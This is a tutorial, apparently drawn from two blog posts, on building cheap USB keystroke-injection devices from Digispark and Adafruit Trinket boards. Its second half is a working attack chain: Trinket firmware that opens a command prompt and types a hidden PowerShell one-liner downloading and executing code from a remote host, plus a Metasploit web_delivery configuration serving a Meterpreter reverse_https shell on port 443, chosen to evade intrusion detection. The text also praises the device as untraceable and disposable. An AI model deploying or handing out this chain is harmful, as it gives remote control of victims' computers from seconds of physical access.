# USB Rubber Ducky

The USB Rubber Ducky is a keystroke injection tool disguised as a generic flash drive. Computers recognize it  as a regular keyboard and automatically accept its pre-programmed keystroke payloads at over 1000 words per minute. Seconds of physical access are all it takes to deploy some of the most advanced pen-test attacks or IT automation tasks. But Rubber Ducky can also help practical jokes execution.

## Using Digispark and Duck2Spark

This is an excellent Hak5 hacking tool. An advantage of cheap hardware from generic off the shelf parts is that it is disposable and almost impossible to trace. Using a Digispark development board and some free software. The Digispark is an Attiny85 based micro controller development board similar to the Arduino Uno, only cheaper and smaller.

### Step 1: Setup Digispark Development Environment

Before starting to work with our board, we must have installed the Arduino IDE. After this, we must download the compatibility package of this board, a fairly simple operation.

After installation Open Arduino IDE application, go to File -> Preferences
In the input field named “Additional Boards Manager URLs” enter the following URL.

Open Arduino IDE — Preferences Tools -> Board -> Boards Manager
From the drop down menu select “Contributed”, Select the Digistump AVR Boards package and install it.

Now we need to install Digispark Bootloader Driver. You only need the driver to program it with arduino. Once you program it, it’ll work like a rubber ducky (a generic USB keyboard) on any device you plug it into without any driver.

https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip

Finally, go to Tools -> Board, and select Digispark (Default — 16.5mhz) and set it as default.

### Step 2: Turning Digispark into a Rubber Ducky Clone

Rubber Ducky uses a simple scripting language to create payloads. For Digispark, things are not that simple. We need to program our own payloads using Digikeyboard.h and Arduino IDE. There are some scripts available for Digispark ATTiny85 in the internet. But thanks to the work of MaMe82 (Marcus Mengs) you can translate Rubber Ducky Scripts to Digispark with duck2spark project.

A great feature of Duck2spark is that available solutions and tutorials emulating a RuberDucky-like on a DigiSpark suffer from poor keyboard layout support for non-US languages. This is solved by “outsourcing” the problem to DuckEncoder which supports multiple keyboard layouts.

Click Sketch -> Upload or click Upload button on the top left. Open a notepad or any software. Plug in the Digispark USB again and magically “Hello World” will be typed.

Rubber Ducky Payloads can be anything; It changes as per our goals and intentions! We can Create Wireless Network Association, Download and execute payloads, reverse shells, etc. For pen testing engagements we can even use Meterpreter, Empire, Unicorn, or any other powershell payloads.

A final tip use some heat shrink tubing to provide electrical insulation, mechanical protection, sealing, and some stealth to your new Digispark-Ducky. A device that’s cheap enough that you don’t mind leaving it at the scene if you’ve got to pull on your ninja outfit and make a break for it.

## Using the 5V Adafruit Trinket and a micro USB cable

### Step 1

Luckily Adafruit supplies a library for interfacing with a computer as a keyboard so the first step is to #include it. You will need to install the library.

### Step 2

Looking good, I want to run commands on the target machine, I can do that by ‘typing’ the windows key, cmd, enter, then the command.

```c
#include <TrinketKeyboard.h>

void pressEnter() {
	TrinketKeyboard.pressKey(0, 0x28);
	delay(10);
	TrinketKeyboard.pressKey(0,0);
	delay(300);
}

void winRun() {
	TrinketKeyboard.pressKey(0x08, 0x15);
	delay(30);
	TrinketKeyboard.pressKey(0,0);
}

void setup() {
	TrinketKeyboard.begin();
	delay(1000);
	winRun();
	delay(100);
	winRun();
	delay(300);
	// Run cmd
	TrinketKeyboard.print("cmd");
	pressEnter();
	delay(500);
	TrinketKeyboard.print("ipconfig");
	delay(100);
	pressEnter();
}
```

### Step 3

Lets setup our exploit in Metasploit.

We are targeting a 64 bit Windows 10 box for this, so I will choose the PowerShell target, but let’s be clear, this isn’t an exploit against PowerShell. It simply uses it to download and execute a payload from the web server.
```
use exploit/multi/script/web_delivery
```
We need to tell our payload where to download the binary from:
```
set LHOST 1.2.3.4
```
Next we set an inconspicuous port, how about 443. ;)
```
set LPORT 443
```
Metasploit will generate a random URIPATH every time, and we want to be able to use start and stop our listener whenever we like without needing to recompile the code for the Trinket.
```
set URIPATH /
```
We then need to choose Powershell as our delivery method. This exploit supports 3 targets noted by an id, 0: Python, 1: PHP, and 2: Powershell.
```
set TARGET 2
```
Now set a payload, I will use reverse_https because we are using 443 as our port. Should look like a normal connection to most IDSs.
```
set PAYLOAD windows/meterpreter/reverse_https
```
And finally exploit

To make it easy to start and stop our listener we will turn this into a configuration file: usb.rc
```
use exploit/multi/script/web_delivery
set LHOST 1.2.3.4
set LPORT 443
set URIPATH /
set TARGET 2
set PAYLOAD windows/meterpreter/reverse_https
exploit
```
This will give us a payload to run on the target machine:
```
powershell.exe -nop -w hidden -c $N=new-object net.webclient;$N.proxy=[Net.WebRequest]::GetSystemWebProxy();$N.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $N.downloadstring('http://1.2.3.4:8080/');
```
We can now put this into our trinket.

```c

#include <TrinketKeyboard.h>

void pressEnter() {
    TrinketKeyboard.pressKey(0, 0x28);
  	delay(10);
  	TrinketKeyboard.pressKey(0,0);
  	delay(300);
}

void winRun() {
  	TrinketKeyboard.pressKey(0x08, 0x15);
  	delay(30);
  	TrinketKeyboard.pressKey(0,0);
}

void setup() {
  	TrinketKeyboard.begin();
  	delay(1000);
  	winRun();
  	delay(100);
  	winRun();
  	delay(300);
  	// Run cmd
  	TrinketKeyboard.print("cmd");
  	pressEnter();
  	delay(500);
  	TrinketKeyboard.print("powershell.exe -nop -w hidden -c $N=new-object net.webclient;$N.proxy=[Net.WebRequest]::GetSystemWebProxy();$N.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $N.downloadstring('http://1.2.3.4:8080/');"); 
  	delay(100);
  	pressEnter();
}


void loop() {
  	// nothing happens after setup
}
```


## Reference
[Low-cost USB Rubber Ducky pen-test tool for $3 using Digispark and Duck2Spark](https://hackernoon.com/low-cost-usb-rubber-ducky-pen-test-tool-for-3-using-digispark-and-duck2spark-5d59afc1910)

[Building a USB Rubber Ducky for $7](https://medium.com/@EatonChips/building-a-usb-rubber-ducky-for-7-c851aae30a1d)

